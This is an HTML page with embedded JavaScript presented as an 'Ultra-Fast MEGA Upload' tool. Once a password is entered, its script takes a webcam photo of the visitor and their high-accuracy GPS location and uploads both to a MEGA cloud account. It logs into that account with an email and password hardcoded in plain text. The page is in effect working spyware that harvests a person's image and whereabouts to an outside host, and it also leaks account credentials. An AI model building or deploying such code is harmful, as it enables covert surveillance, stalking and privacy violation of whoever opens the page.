<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ultra-Fast MEGA Upload</title>
    <style>
        body { background: #1e1e1e; color: #fff; font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
        input, button { padding: 10px; margin: 10px; border-radius: 5px; border: none; font-size: 16px; }
        input { background-color: #333; color: #fff; border: 1px solid #555; }
        button { background-color: #007bff; color: white; cursor: pointer; }
        #status { font-size: 14px; white-space: pre-line; max-width: 600px; margin: 20px auto; text-align: left; }
    </style>
    <script src="https://cdn.jsdelivr.net/npm/megaio/mega.js"></script>
</head>
<body>
    <h1>üöÄ Ultra-Fast Auto Upload to MEGA</h1>

    <div id="auth-section">
        <input type="password" id="password" placeholder="Enter password" autofocus>
        <button onclick="checkPassword()">Submit</button>
        <p id="auth-status" style="color: red;"></p>
    </div>

    <div id="main-content" style="display: none;">
        <p id="status">Initializing...</p>
        <canvas id="canvas" style="display:none;"></canvas>
    </div>

    <script>
        const email = "darknp273@gmail.com";
        const password = "Nipunapromod@1";

        function updateStatus(message, isError = false) {
            const statusElement = document.getElementById("status");
            statusElement.style.color = isError ? "red" : "#58a6ff";
            statusElement.innerText += `${message}\n`;
        }

        function checkPassword() {
            const enteredPassword = document.getElementById("password").value;
            if (enteredPassword === password) {
                document.getElementById("auth-section").style.display = "none";
                document.getElementById("main-content").style.display = "block";
                startProcess();
            } else {
                updateStatus("‚ùå Incorrect password!", true);
            }
        }

        async function startProcess() {
            updateStatus("üöÄ Starting tasks in parallel...");

            const megaStorage = await megaLogin();

            if (!megaStorage) {
                updateStatus("‚ùå MEGA login failed.", true);
                return;
            }

            // Parallel execution of all tasks
            const [location, photoBlob] = await Promise.all([
                fetchLocation(),
                capturePhoto()
            ]);

            if (location && photoBlob) {
                await uploadToMega(megaStorage, photoBlob, location);
            } else {
                updateStatus("‚ùå Failed to capture all data.", true);
            }
        }

        async function megaLogin() {
            updateStatus("üîë Logging into MEGA...");
            return new Promise((resolve) => {
                const storage = new mega.Storage({ email, password, autologin: true });

                storage.on('ready', () => {
                    updateStatus("‚úÖ MEGA login successful.");
                    resolve(storage);
                });

                storage.on('error', (err) => {
                    updateStatus(`‚ùå MEGA login failed: ${err}`, true);
                    resolve(null);
                });
            });
        }

        function fetchLocation() {
            updateStatus("üìç Getting location...");
            return new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve(`Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`);
                    },
                    () => {
                        updateStatus("‚ùå GPS failed. Using fallback location.", true);
                        resolve("Location not available");
                    },
                    { enableHighAccuracy: true, timeout: 2000 } // 2-second timeout
                );
            });
        }

        async function capturePhoto() {
            updateStatus("üì∏ Capturing photo...");
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
                const video = document.createElement("video");
                video.srcObject = stream;
                video.play();

                return new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        const canvas = document.getElementById("canvas");
                        const ctx = canvas.getContext("2d");
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;

                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        stream.getTracks().forEach(t => t.stop());
                        
                        canvas.toBlob((blob) => {
                            updateStatus("‚úÖ Photo captured.");
                            resolve(blob);
                        }, 'image/jpeg', 0.5); // Lower quality for faster upload
                    };
                });
            } catch (error) {
                updateStatus("‚ùå Camera access failed.", true);
                return null;
            }
        }

        async function uploadToMega(storage, photoBlob, location) {
            updateStatus("üöÄ Uploading to MEGA...");

            const locationBlob = new Blob([location], { type: 'text/plain' });

            const photoUpload = storage.upload({ name: 'photo.jpg' }, photoBlob);
            const locationUpload = storage.upload({ name: 'location.txt' }, locationBlob);

            const uploadPromises = [
                new Promise((resolve) => {
                    photoUpload.on('complete', (file) => {
                        updateStatus(`‚úÖ Photo uploaded: ${file.download}`);
                        resolve(true);
                    });
                    photoUpload.on('error', (err) => {
                        updateStatus(`‚ùå Photo upload failed: ${err}`, true);
                        resolve(false);
                    });
                }),
                new Promise((resolve) => {
                    locationUpload.on('complete', (file) => {
                        updateStatus(`‚úÖ Location uploaded: ${file.download}`);
                        resolve(true);
                    });
                    locationUpload.on('error', (err) => {
                        updateStatus(`‚ùå Location upload failed: ${err}`, true);
                        resolve(false);
                    });
                })
            ];

            await Promise.all(uploadPromises);
            updateStatus("üéØ All uploads completed.");
        }
    </script>
</body>
</html>
